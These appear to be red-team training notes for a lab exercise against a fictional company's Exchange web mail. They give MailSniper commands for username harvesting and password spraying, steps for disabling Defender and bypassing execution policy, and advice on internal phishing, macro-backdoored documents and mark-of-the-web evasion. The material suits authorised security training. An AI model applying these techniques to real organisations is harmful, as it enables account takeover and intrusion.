# Initial Compromise

Attack the OWA Exchange service at mail.cyberbotic.io.

## Password Spraying

Tools for password spraying against Office 365 and Exchange:
* [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
* [MailSniper](https://github.com/dafthack/MailSniper)
* [namemash](https://gist.github.com/superkojiman/11076951)

On Attacker Desktop:
  1. Disable Defender's Real-time protection
  2. Download [MailSniper](https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1)
  3. In an Admin PS, run ```Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine```
  4. In a standard PS, import MailSniper: ```ipmo .\MailSniper.ps1```
  5. ```Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io```  // gives NetBIOS name of domain
  6. Generate possible usernames from names at [https://www.cyberbotic.io/our-team](https://www.cyberbotic.io/our-team):
    5. ```cd /mnt/c/Users/Attacker/Desktop/```
    6. ```cat names.txt```:
        * Bob Farmer
        * Isabel Yates
        * John King
        * Joyce Adams
    8. Use [namemash](https://gist.github.com/superkojiman/11076951) to generate usernames (if format isn't already known): ```python ./namemash.py names.txt > possible.txt```
  9. ```Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList possible.txt -OutFile valid.txt```  // validates usernames using timing attack
  10. Use [MailSniper](https://github.com/dafthack/MailSniper) to spray passwords against valid accounts (beware of login lockouts!):
  11. ```Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList valid.txt -Password Summer2022```


## Internal Phishing
With the credentials of a legit internal user, many doors open, e.g.:
* Emails that may contain sensitive information such as documents, usernames, and passwords
* Send internal emails on behalf of the user, containing specially crafted files/links, or even download a document already in an inbox, backdoor it (e.g. with a macro) and send it back to somebody

## Initial Access Payloads
Two options for delivering a payload that will execute on their system:

1. Send a URL from which a payload can download
2. Attach a payload to the phishing email

Files emailed "internally" from a compromised Exchange mailbox are not tagged with a Zone Identifier, and won't have the "mark of the web" and come under greater scrutiny.



